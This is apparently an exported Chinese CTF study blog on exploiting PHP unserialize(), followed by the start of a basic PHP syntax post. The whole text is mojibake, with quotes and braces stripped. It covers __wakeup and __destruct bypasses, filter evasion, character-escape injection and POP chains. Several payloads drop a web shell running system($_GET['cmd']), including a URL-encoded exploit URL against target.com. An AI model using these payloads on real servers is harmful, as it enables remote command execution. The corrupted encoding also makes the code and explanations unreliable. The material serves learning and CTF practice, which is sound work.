__construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨__destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨__toString()å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è¾“å‡ºçš„æ—¶å€™(è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™)è¢«è°ƒç”¨__sleep()æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__wakeup()æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° ä½¿ç”¨å®ä¾‹ï¼š ?php class test public $a=hacked by ikkunma; public $b=hacked by ikkunmma; public function pt() echo $this-a.br/; public function __construct() echo __constructbr/; public function __destruct() echo __constructbr/; public function __sleep() echo __sleepbr/; return array(a,b); public function __wakeup() echo __wakeupbr/; //åˆ›å»ºå¯¹è±¡è°ƒç”¨__construct $object = new test(); //åºåˆ—åŒ–å¯¹è±¡è°ƒç”¨__sleep $serialize = serialize($object); //è¾“å‡ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸² echo serialize: .$serialize.br/; //ååºåˆ—åŒ–å¯¹è±¡è°ƒç”¨__wakeup $unserialize=unserialize($serialize); //è°ƒç”¨ptè¾“å‡ºæ•°æ® $unserialize-pt(); //è„šæœ¬ç»“æŸè°ƒç”¨__destruct? è¾“å‡ºï¼š __construct__sleepserialize: O:4:test:2:s:1:a;s:17:hacked by ikkunma;s:1:b;s:18:hacked by ikkunmma;__wakeup__hacked by ikkunma__construct__construct åŸæ¥æœ‰ä¸€ä¸ªå®ä¾‹åŒ–å‡ºçš„å¯¹è±¡ï¼Œç„¶ååˆååºåˆ—åŒ–å‡ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å­˜åœ¨ä¸¤ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æœ€åé”€æ¯äº†ä¸¤ä¸ªå¯¹è±¡ä¹Ÿå°±å‡ºç°äº†æ‰§è¡Œäº†ä¸¤æ¬¡__destruct ä¾‹é¢˜ ä¸€ æºç ï¼š ?phperror_reporting(0);include flag.php;$KEY = ikkunma;$str = $_GET[str];if (unserialize($str) === $KEY) echo $flag;show_source(__FILE__); æˆ‘ä»¬è¾“å…¥çš„ä¸€ä¸ªå˜é‡ååºåˆ—åŒ–åçš„å€¼ç­‰äºikkunma ?php $a=ikkunma; $b=serialize($a); echo $b;? åºåˆ—åŒ–å¾—åˆ°ï¼š s:7:ikkunma; å°†åºåˆ—åŒ–åçš„å†…å®¹ä¼ å…¥urlå¾—åˆ°flag ?str=s:7:ikkunma; äºŒ æºç ï¼š class foo public $file = 2.txt; // æ§åˆ¶å†™å…¥çš„æ–‡ä»¶å public $data = test; // æ§åˆ¶å†™å…¥çš„å†…å®¹ function __destruct() // åœ¨å¯¹è±¡é”€æ¯æ—¶å†™å…¥æ–‡ä»¶ file_put_contents(dirname(__FILE__)./.$this-file, $this-data); $file_name = $_GET[filename]; // è·å–ç”¨æˆ·ä¼ å…¥çš„æ–‡ä»¶åprint You have readfile .$file_name;// è¯»å–ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶ï¼Œå¹¶è¿›è¡Œ unserializeunserialize(file_get_contents($file_name)); è¿™ä¸²ä»£ç çš„æ„æ€æ˜¯å°†è¯»å–çš„æ–‡ä»¶å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œ__destructå‡½æ•°é‡Œé¢æ˜¯ç”Ÿæˆæ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬æœ¬åœ°å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åæ˜¯flag.txtï¼Œé‡Œé¢çš„å†…å®¹æ˜¯ O:3:foo:2:s:4:file;s:9:shell.php;s:4:data;s:31:?php system($_GET[cmd]); ?; å°†å®ƒè¿›è¡Œååºåˆ—åŒ–å°±ä¼šç”Ÿæˆshell.phpé‡Œé¢çš„å†…å®¹ä¸º?php system($_GET['cmd']); ? æ„é€ payloadï¼š?filename=flag.txt å„ç§ç»•è¿‡å§¿åŠ¿ ç»•è¿‡__wakeup(CVE-2016-7124) __wakeup()é­”æœ¯æ–¹æ³•åœ¨æ‰§è¡Œunserialize()æ—¶ï¼Œä¼šä¼˜å…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè€Œä¸ä¼šæ‰§è¡Œ__construct() å‡½æ•° æ¡ä»¶ PHP55.6.25 PHP7 7.0.10 ç»•è¿‡ åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ å®ä¾‹ æºç ï¼š ?phpclass test public $a; public function __construct() $this-a = abc; public function __wakeup() $this-a=def; public function __destruct() echo $this-a; å…¶åºåˆ—åŒ–åä¸º O:4:test:1:s:1:a;s:3:abc; æ‰§è¡Œååºåˆ—åŒ– unserialize('O:4:test:1:s:1:a;s:3:abc;');ï¼Œå¾—åˆ°ç»“æœä¸º def ï¼Œè¯´æ˜ä¼˜å…ˆæ‰§è¡Œäº† __wakeup() æ­¤æ—¶æˆ‘ä»¬è¦ç»•è¿‡ __wakeup()ï¼šæŠŠå¯¹è±¡çš„å±æ€§ä¸ªæ•°æ”¹å¤§ O:4:test:666:s:1:a;s:3:abc; æ‰§è¡Œååºåˆ—åŒ– unserialize('O:4:test:666:s:1:a;s:3:abc;'); å¾—åˆ°ç»“æœä¸º abc , å‘ç°å¹¶æ²¡æœ‰æ‰§è¡Œ __wakeup()ï¼Œç»•è¿‡æˆåŠŸ ç»•è¿‡__destruct() __destructæ˜¯PHPå¯¹è±¡çš„ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œç§°ä¸ºææ„å‡½æ•°ï¼Œé¡¾åæ€ä¹‰è¿™æ˜¯å½“è¯¥å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œçš„ä¸€ä¸ªå‡½æ•°ã€‚å…¶ä¸­ä»¥ä¸‹æƒ…å†µä¼šè§¦å‘__destruct ä¸»åŠ¨è°ƒç”¨unset($obj) ä¸»åŠ¨è°ƒç”¨$obj = NULL ç¨‹åºè‡ªåŠ¨ç»“æŸ PHPè¿˜æ‹¥æœ‰åƒåœ¾å›æ”¶Garbage collectionå³æˆ‘ä»¬å¸¸è¯´çš„GCæœºåˆ¶ PHPä¸­GCä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸè‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å½“æˆ‘ä»¬çš„å¯¹è±¡å˜æˆäº†â€œåƒåœ¾â€ï¼Œå°±ä¼šè¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰ï¼Œå›æ”¶è¿‡ç¨‹ä¸­ï¼Œå°±ä¼šè°ƒç”¨å‡½æ•°çš„__destruct å½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰ä»»ä½•å¼•ç”¨çš„æ—¶å€™ï¼Œåˆ™ä¼šè¢«è§†ä¸ºâ€œåƒåœ¾â€ï¼Œå¦‚ï¼š $a = new test(); //test å¯¹è±¡è¢«å˜é‡aå¼•ç”¨ï¼Œæ‰€ä»¥è¯¥å¯¹è±¡ä¸æ˜¯â€œåƒåœ¾â€new test(); //test åœ¨æ²¡æœ‰è¢«å¼•ç”¨æ—¶ä¾¿ä¼šè¢«å½“ä½œâ€œåƒåœ¾â€è¿›è¡Œå›æ”¶(å¦‚æœ()é‡Œæœ‰å‚æ•°åˆ™ä¸æ˜¯åƒåœ¾)$a = new test();$a = 1; //test åœ¨å¤±å»å¼•ç”¨æ—¶ä¾¿ä¼šè¢«å½“ä½œâ€œåƒåœ¾â€è¿›è¡Œå›æ”¶ å®ä¾‹ æºç ï¼š ?phpclass test function __destruct() echo success!!; if(isset($_REQUEST[input])) $a = unserialize($_REQUEST[input]); throw new Exception(lose); è¿™é‡Œæˆ‘ä»¬è¦æ±‚è¾“å‡º success!! ï¼Œä½†æ‰§è¡Œååºåˆ—åŒ–åå¾—åˆ°çš„å¯¹è±¡æœ‰äº†å¼•ç”¨ï¼Œç»™äº† a å˜é‡ï¼Œåé¢ç¨‹åºæ¥ç€å°±æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œéæ­£å¸¸ç»“æŸï¼Œå¯¼è‡´æœªæ­£å¸¸å®Œæˆ GC æœºåˆ¶ï¼Œå³æ²¡æœ‰æ‰§è¡Œ __destruct ?input=O:4:test:0: //ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ æ‰€ä»¥æˆ‘ä»¬è¦ååºåˆ—åŒ–æ‰‹åŠ¨å» â€œé”€æ¯â€ åˆ›é€ çš„å¯¹è±¡ï¼Œè¿™é‡Œåˆ©ç”¨æ•°ç»„æ¥å®Œæˆ åŸç†ï¼š æˆ‘ä»¬åºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„å¯¹è±¡ï¼Œè€ƒè™‘ååºåˆ—åŒ–æœ¬å­—ç¬¦ä¸²ï¼Œå› ä¸ºååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†Array[0]è®¾ç½®ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†Array[0]è®¾ç½®ä¸ºnullï¼Œè¿™æ ·å‰é¢çš„testå¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ__destructäº† æ„é€ ï¼š class test $a = serialize(array(new test, null));echo $a.br/;$a = str_replace(:1, :0, $a);//å°†åºåˆ—åŒ–çš„æ•°ç»„ä¸‹æ ‡ä¸º0çš„å…ƒç´ ç»™ä¸ºnullecho $a; å¾—åˆ°ï¼š a:2:i:0;O:4:test:0:i:1;N;a:2:i:0;O:4:test:0:i:0;N;//æœ€ç»ˆpayload ä¼ å…¥ï¼š ?input=a:2:i:0;O:4:test:0:i:0;N; //æˆåŠŸå¾—åˆ° success!! ç»•è¿‡æ­£åˆ™ å¦‚preg_match('/^O:\\d+/')åŒ¹é…åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´ ç»•è¿‡ åˆ©ç”¨åŠ å·ç»•è¿‡ï¼ˆæ³¨æ„åœ¨urlé‡Œä¼ å‚æ—¶+è¦ç¼–ç ä¸º%2Bï¼‰ åˆ©ç”¨æ•°ç»„å¯¹è±¡ç»•è¿‡ï¼Œå¦‚ serialize(array($a)); aä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡(åºåˆ—åŒ–ç»“æœå¼€å¤´æ˜¯aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„$açš„ææ„) ?phpclass test public $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a.PHP_EOL; function match($data) if (preg_match(/^O:\\d+/,$data)) die(nonono!); else return $data; $a = O:4:test:1:s:1:a;s:3:abc;;// +å·ç»•è¿‡$b = str_replace(O:4,O:+4, $a);unserialize(match($b));// å°†å¯¹è±¡æ”¾å…¥æ•°ç»„ç»•è¿‡ serialize(array($a));unserialize(a:1:i:0;O:4:test:1:s:1:a;s:3:abc;); å­—ç¬¦é€ƒé€¸ å¯¹äºå­—ç¬¦é€ƒé€¸, ç”±äº PHP åºåˆ—åŒ–åçš„å­—ç¬¦ç±»å‹ä¸­çš„å¼•å·ä¸ä¼šè¢«è½¬ä¹‰, å¯¹äºå­—ç¬¦ä¸²æœ«å°¾é æä¾›çš„å­—ç¬¦æ•°é‡æ¥è¯»å–, å¯¹äºæœåŠ¡ç«¯ä¸Šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²å®é™…é•¿åº¦è¿›è¡Œå¢åŠ æˆ–å‡å°‘(ä¾‹å¦‚æ›¿æ¢æŒ‡å®šå­—ç¬¦åˆ°æ›´é•¿/çŸ­çš„å­—ç¬¦), æˆ‘ä»¬å°±å¯ä»¥å°†å…¶æº¢å‡ºå¹¶æˆ‘ä»¬çš„æ¶æ„å­—ç¬¦ä¸²ååºåˆ—åŒ–. ?phpclass Book public $id = 114514; public $name = Ikkunmaa çš„å­¦ä¹ ç¬”è®°; // å¯æ§ public $path = Ikkunmaa çš„å­¦ä¹ ç¬”è®°.md;function filter($str) return str_replace(, \\\\, $str);$exampleBook = new Book();echo [å¤„ç†å‰] ;$ser = serialize($exampleBook);echo $ser . ;echo [å¤„ç†å] ;$ser = filter($ser);echo $ser . ;echo [æ–‡ä»¶è·¯å¾„] ;$exampleBook = unserialize($ser);echo $exampleBook-path . ; åºåˆ—åŒ–ä¸º O:4:Book:3:s:2:id;i:114514;s:4:name;s:25:Ikkunmaa çš„å­¦ä¹ ç¬”è®°;s:4:path;s:27:Ikkunmaa çš„å­¦ä¹ ç¬”è®°.md; æ­¤ä»£ç ä¼šå°†å…¶ä¸­çš„å•å¼•å· ' è¿‡æ»¤æˆä¸º\\'ï¼ˆé•¿åº¦å¢åŠ  1ï¼‰ æˆ‘ä»¬å¯ä»¥æ„é€ å¸¦ ' çš„ nameï¼Œä½¿ name çš„å®é™…é•¿åº¦æ¯” s:25 é¢„æœŸçš„é•¿ ååºåˆ—åŒ–æ—¶ï¼ŒPHPä»æŒ‰ç…§ s:25 è¯»å–ï¼Œä½† name å˜é•¿åï¼Œä¼šæº¢å‡ºåˆ° pathï¼Œä»è€Œæ§åˆ¶ path çš„å€¼ æ„é€ payloadï¼š O:4:Book:3:s:2:id;i:114514;s:4:name;s:25:AAAAAAAAAAAAAAAAAAAAAAAAA;s:4:path;s:8:flag.php; é€šè¿‡postæäº¤ï¼š POST /vuln.php HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodeddata=O:4:Book:3:s:2:id;i:114514;s:4:name;s:25:AAAAAAAAAAAAAAAAAAAAAAAAA;s:4:path;s:8:flag.php; åˆ©ç”¨å¼•ç”¨ç»•è¿‡ PHP ä¸­çš„å¼•ç”¨ () æ˜¯ä¸€ç§ç‰¹æ®Šçš„æœºåˆ¶ï¼Œå®ƒä½¿å¾—å˜é‡æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€ ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥åˆ©ç”¨å¼•ç”¨æ¥å°†å¤šä¸ªå˜é‡æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œä¿®æ”¹å¯¹è±¡çš„æŸäº›å±æ€§æˆ–æ“ä½œå¯¹è±¡çš„è¡Œä¸º å®ä¾‹ æºç ï¼š ?phpclass test public $a; public $b; public function __construct() $this-a = aaa; public function __destruct() if($this-a === $this-b) echo you success; if(isset($_REQUEST[input])) if(preg_match(/aaa/, $_REQUEST[input])) die(nonono); unserialize($_REQUEST[input]);else highlight_file(__FILE__); è¦æ±‚è¾“å‡º you successï¼Œä½†æ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ä¸èƒ½ç”± aaa æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼•ç”¨ç»•è¿‡ ?input=O:4:test:2:s:1:a;s:3:aaa;s:1:b;R:1; 16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤ åºåˆ—å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æ ?phpclass Read public $name; public function __wakeup() if ($this-name == flag) echo You did it!; $str = ;if (strpos($str, flag) === false) $obj = unserialize($str);else echo You cant do it!; è¿™é‡Œæ£€æµ‹äº†æ˜¯å¦åŒ…å« flag å­—ç¬¦, æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ flag çš„åå…­è¿›åˆ¶ \\66\\6c\\61\\67 æ¥ç»•è¿‡, æ„é€ ä»¥ä¸‹: O:4:Read:1:s:4:name;S:4:\\66\\6c\\61\\67; POPé“¾æ„é€  POPï¼ˆProperty-Oriented Programmingï¼‰æ˜¯ä¸€ç§åŸºäºå¯¹è±¡å±æ€§çš„ç¼–ç¨‹æŠ€æœ¯ï¼Œé€šå¸¸ç”¨äºPHP ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ å½“ PHP ä»£ç ä½¿ç”¨ unserialize() ååºåˆ—åŒ–ç”¨æˆ·å¯æ§çš„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„å¯¹è±¡é“¾ï¼ˆPOP é“¾ï¼‰è§¦å‘ç‰¹å®šçš„æ–¹æ³•ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€æ–‡ä»¶è¯»å–ã€æ–‡ä»¶å†™å…¥ç­‰æ”»å‡» ä¾‹é¢˜ ä¸€ 2023å¹´ SWPU NSS ç§‹å­£æ‹›æ–°èµ› (æ ¡å¤–èµ›é“) - UnS3rialize ?phphighlight_file(__FILE__);error_reporting(0);class NSS public $cmd; function __invoke() echo Congratulations!!!You have learned to construct a POP chainbr/; system($this-cmd); function __wakeup() echo W4keup!!!br/; $this-cmd = echo Welcome to NSSCTF; class C public $whoami; function __get($argv) echo what do you want?; $want = $this-whoami; return $want(); class T public $sth; function __toString() echo Now you know how to use __toStringbr/There is more than one way to trigger; return $this-sth-var; class F public $user = nss; public $passwd = ctf; public $notes; function __construct($user, $passwd) $this-user = $user; $this-passwd = $passwd; function __destruct() if ($this-user === SWPU $this-passwd === NSS) echo Now you know how to use __constructbr/; echo your notes.$this-notes; else die(N0!); if (isset($_GET[ser])) $ser = unserialize(base64_decode($_GET[ser])); else echo Lets do some deserialization :); çœ‹åˆ°åœ¨ NSS ç±»çš„ __invoke ä¸‹å­˜åœ¨ system æ‰§è¡Œ, éœ€è¦å°† NSS ç±»ä½œä¸ºå‡½æ•°è°ƒç”¨ åœ¨ C ç±»çš„ __get æ–¹æ³•å°† whoami è¿›è¡Œè°ƒç”¨ (è¿™é‡Œä½¿ç”¨äº†ä¸­é—´å˜é‡ä¸­è½¬), æˆ‘ä»¬å°†å…¶èµ‹å€¼ä¸º NSS ç±», æˆ‘ä»¬éœ€è¦æ‰¾åˆ°è®¿é—®éæ³•å­—æ®µçš„åœ°æ–¹ åœ¨ T çš„ __toString ä¸‹è®¿é—®äº† sth çš„ var (var éæ³•), æˆ‘ä»¬å°†å…¶èµ‹å€¼ä¸º C ç±», éœ€è¦æ‰¾åˆ°å­—ç¬¦ä¸²è°ƒç”¨çš„åœ°æ–¹ åœ¨ F ä¸­çš„ __destruct å­˜åœ¨å¯¹ note å­—ç¬¦ä¸²æ‹¼æ¥, å°†å…¶èµ‹å€¼ä¸º T, å‘ç°éœ€è¦userå’Œpasswdæ»¡è¶³æ¡ä»¶ æˆ‘ä»¬æ„é€ å¦‚ä¸‹ååºåˆ—åŒ–é“¾ ?phpclass NSS public $cmd = cat /flag;class C public $whoami;class T public $sth;class F public $user = SWPU; public $passwd = NSS; public $notes;$f = new F(SWPU, NSS);$t = new T();$c = new C();$nss = new NSS();$c-whoami = $nss;$t-sth = $c;$f-notes = $t;echo serialize($f); äºŒ æºç ï¼š ?php class A public $target = test; function __wakeup() $this-target = wakeup!; function __destruct() $fp = fopen(/var/www/hello.php,w); fputs($fp,$this-target); //å°† $target å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼ˆhello.phpï¼‰ fclose($fp); $a = $_GET[test]; $b = unserialize($a); echo hello.php.br/; include(./hello.php);? æ„é€ åºåˆ—åŒ–ï¼š O:1:A:1:s:7:target;s:34:?php system($_GET[\\cmd\\]); ?; payloadï¼š http://target.com/vulnerable.php?test=O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22target%22%3Bs%3A34%3A%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D å½“ç¨‹åºæ‰§è¡Œæ—¶ï¼Œ__destruct() ä¼šå†™å…¥ hello.php æ–‡ä»¶ include('./hello.php') ä¼šæ‰§è¡Œè¯¥æ–‡ä»¶ å¯ä»¥é€šè¿‡ ?cmd= å‚æ•°æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ http://target.com/vulnerable.php?test=O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22target%22%3Bs%3A34%3A%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7Dcmd=whoami å‚è€ƒï¼š ä¸€æ–‡è®©PHPååºåˆ—åŒ–ä»å…¥é—¨åˆ°è¿›é˜¶-å…ˆçŸ¥ç¤¾åŒº [CTF/Web] PHP ååºåˆ—åŒ–å­¦ä¹ ç¬”è®°-ç¨€åœŸæ˜é‡‘ PHPååºåˆ—åŒ–å…¥é—¨æ‰‹æŠŠæ‰‹è¯¦è§£ ï¼ˆæ¨èï¼‰php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿","tags":["æ¼æ´","PHP","ååºåˆ—åŒ–","POPé“¾"],"categories":["PHP","æ¼æ´"]},{"title":"PHP","path":"/2025/07/09/php/","content":"PHP(è¶…æ–‡æœ¬é¢„å¤„ç†å™¨ï¼ŒæœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€) PHPåŸºç¡€ PHPåŠŸèƒ½ PHP å¯ä»¥ç”ŸæˆåŠ¨æ€é¡µé¢å†…å®¹ PHP å¯ä»¥åˆ›å»ºã€æ‰“å¼€ã€è¯»å–ã€å†™å…¥ã€å…³é—­æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ PHP å¯ä»¥æ”¶é›†è¡¨å•æ•°æ® PHP å¯ä»¥å‘é€å’Œæ¥æ”¶ cookies PHP å¯ä»¥æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹æ‚¨çš„æ•°æ®åº“ä¸­çš„æ•°æ® PHP å¯ä»¥é™åˆ¶ç”¨æˆ·è®¿é—®æ‚¨çš„ç½‘ç«™ä¸Šçš„ä¸€äº›é¡µé¢ PHP å¯ä»¥åŠ å¯†æ•°æ® é€šè¿‡ PHPï¼Œä¸å†é™äºè¾“å‡º HTMLï¼Œè¿˜å¯ä»¥è¾“å‡ºå›¾åƒã€PDF æ–‡ä»¶ï¼Œç”šè‡³ Flash ç”µå½±ï¼Œè¿˜å¯ä»¥è¾“å‡ºä»»æ„çš„æ–‡æœ¬ï¼Œæ¯”å¦‚ XHTML å’Œ XML PHPè¯­æ³• PHP è„šæœ¬å¯ä»¥æ”¾åœ¨æ–‡æ¡£ä¸­çš„ä»»ä½•ä½ç½®ã€‚PHP è„šæœ¬ä»¥ ç»“æŸï¼Œæ¯ä¸ªä»£ç è¡Œéƒ½å¿…é¡»ä»¥åˆ†å·ç»“æŸï¼Œ æœ‰ä¸¤ç§åœ¨æµè§ˆå™¨è¾“å‡ºæ–‡æœ¬çš„åŸºç¡€æŒ‡ä»¤ï¼šecho å’Œ printï¼Œæœ‰ä¸¤ç§æ³¨é‡Šæ–¹æ³•ï¼š// å’Œ / / PHPå˜é‡ å˜é‡ä»¥ $ ç¬¦å·å¼€å§‹ï¼Œåé¢è·Ÿç€å˜é‡çš„åç§°ï¼Œå˜é‡ååªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—ä»¥åŠä¸‹åˆ’çº¿ï¼ˆA-zã€0-9 å’Œ _ ï¼‰ï¼Œå¿…é¡»ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å­—ç¬¦å¼€å§‹ PHP æ²¡æœ‰å£°æ˜å˜é‡çš„å‘½ä»¤ï¼Œåœ¨ç¬¬ä¸€æ¬¡èµ‹å€¼æ—¶å°±è¢«åˆ›å»º PHP global å…³é”®å­— global å…³é”®å­—ç”¨äºå‡½æ•°å†…è®¿é—®å…¨å±€å˜é‡ï¼Œåœ¨å‡½æ•°å†…è°ƒç”¨å‡½æ•°å¤–å®šä¹‰çš„å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å‡½æ•°ä¸­çš„å˜é‡å‰åŠ ä¸Š global å…³é”®å­— PHP å°†æ‰€æœ‰å…¨å±€å˜é‡å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º $GLOBALS[index] çš„æ•°ç»„ä¸­ã€‚ index ä¿å­˜å˜é‡çš„åç§°ã€‚è¿™ä¸ªæ•°ç»„å¯ä»¥åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ¥æ›´æ–°å…¨å±€å˜é‡ global $x,$y; $y=$x+$y;//$GLOBALS[y]=$GLOBALS[x]+$GLOBALS[y]; Static ä½œç”¨åŸŸ åœ¨ç¬¬ä¸€æ¬¡å£°æ˜å˜é‡æ—¶ä½¿ç”¨ static å…³é”®å­—ï¼Œå¯ä»¥ä½¿å¾—å½“ä¸€ä¸ªå‡½æ•°å®Œæˆæ—¶ï¼ŒæŸä¸ªå±€éƒ¨å˜é‡ä¸ä¼šè¢«åˆ é™¤ å³æ¯æ¬¡è°ƒç”¨å‡½æ•°æ—¶ï¼Œè¯¥å˜é‡å°†ä¼šä¿ç•™ç€å‡½æ•°å‰ä¸€æ¬¡è¢«è°ƒç”¨æ—¶çš„å€¼ã€‚ æ³¨ï¼šè¯¥å˜é‡ä»ç„¶æ˜¯å‡½æ•°çš„å±€éƒ¨å˜é‡ PHP echo å’Œ print è¯­å¥ echoäºprintåŒºåˆ« echo - å¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²ï¼Œä¸”è¾“å‡ºé€Ÿåº¦æ¯”printå¿« print - åªå…è®¸è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›å€¼æ€»ä¸º 1 echoè¯­å¥ ?phpecho h2PHP å¾ˆæœ‰è¶£!/h2;echo Hello world!br;echo æˆ‘è¦å­¦ PHP!br;echo è¿™æ˜¯ä¸€ä¸ª, å­—ç¬¦ä¸²ï¼Œ, ä½¿ç”¨äº†, å¤šä¸ª, å‚æ•°ã€‚;? ?php$txt1=å­¦ä¹  PHP;$txt2=RUNOOB.COM;$cars=array(Volvo,BMW,Toyota); echo $txt1;echo br;echo åœ¨ $txt2 å­¦ä¹  PHP ;echo br;echo æˆ‘è½¦çš„å“ç‰Œæ˜¯ $cars[0];? printè¯­å¥ ä¸ä¸Šè¿°ä¾‹å­åŸºæœ¬ä¸€è‡´ï¼Œä¸‹ä¾‹ä¸é€‚ç”¨print echo è¿™æ˜¯ä¸€ä¸ª, å­—ç¬¦ä¸²ï¼Œ, ä½¿ç”¨äº†, å¤šä¸ª, å‚æ•°ã€‚; PHP EOF(heredoc) PHP EOF(heredoc)æ˜¯ä¸€ç§åœ¨å‘½ä»¤è¡Œshellï¼ˆå¦‚shã€cshã€kshã€bashã€PowerShellå’Œzshï¼‰å’Œç¨‹åºè¯­è¨€ï¼ˆåƒPerlã€PHPã€Pythonå’ŒRubyï¼‰é‡Œå®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³• ä»¥ EOF å¼€å§‹æ ‡è®°å¼€å§‹ï¼Œä»¥ EOF ç»“æŸæ ‡è®°ç»“æŸï¼Œç»“æŸæ ‡è¯†å¿…é¡»é¡¶æ ¼ç‹¬è‡ªå ä¸€è¡Œ(å³å¿…é¡»ä»è¡Œé¦–å¼€å§‹ï¼Œå‰åä¸èƒ½è¡”æ¥ä»»ä½•ç©ºç™½å’Œå­—ç¬¦)ï¼Œä¸”åœ¨ç»“æŸæ ‡è®°æœ«å°¾è¦æœ‰åˆ†å· å¼€å§‹æ ‡è®°å’Œç»“æŸæ ‡è®°ç›¸åŒï¼Œæ¯”å¦‚å¸¸ç”¨å¤§å†™çš„ EOTã€EODã€EOF æ¥è¡¨ç¤ºï¼Œä½†æ˜¯ä¸åªé™äºé‚£å‡ ä¸ª(ä¹Ÿå¯ä»¥ç”¨ï¼šJSONã€HTMLç­‰)ï¼Œå¼€å§‹æ ‡è®°å’Œç»“æŸæ ‡è®°ä¸åœ¨æ­£æ–‡ä¸­å‡ºç° å¼€å§‹æ ‡è¯†å¸¦å•å¼•å·åˆ™ä¸è§£é‡Šå†…åµŒçš„å˜é‡å’Œè½¬ä¹‰ç¬¦å· åœ¨ heredoc ä¸­ï¼Œå˜é‡ä¸éœ€è¦ç”¨è¿æ¥ç¬¦ . æˆ– , æ¥æ‹¼æ¥ ?phpecho EOF h1æˆ‘çš„ç¬¬ä¸€ä¸ªæ ‡é¢˜/h1 pæˆ‘çš„ç¬¬ä¸€ä¸ªæ®µè½ã€‚/pEOF;// ç»“æŸéœ€è¦ç‹¬ç«‹ä¸€è¡Œä¸”å‰åä¸èƒ½ç©ºæ ¼? ?php$name=runoob;$a= EOF abc$name 123EOF;// ç»“æŸéœ€è¦ç‹¬ç«‹ä¸€è¡Œä¸”å‰åä¸èƒ½ç©ºæ ¼echo $a;? PHPæ•°æ®ç±»å‹ 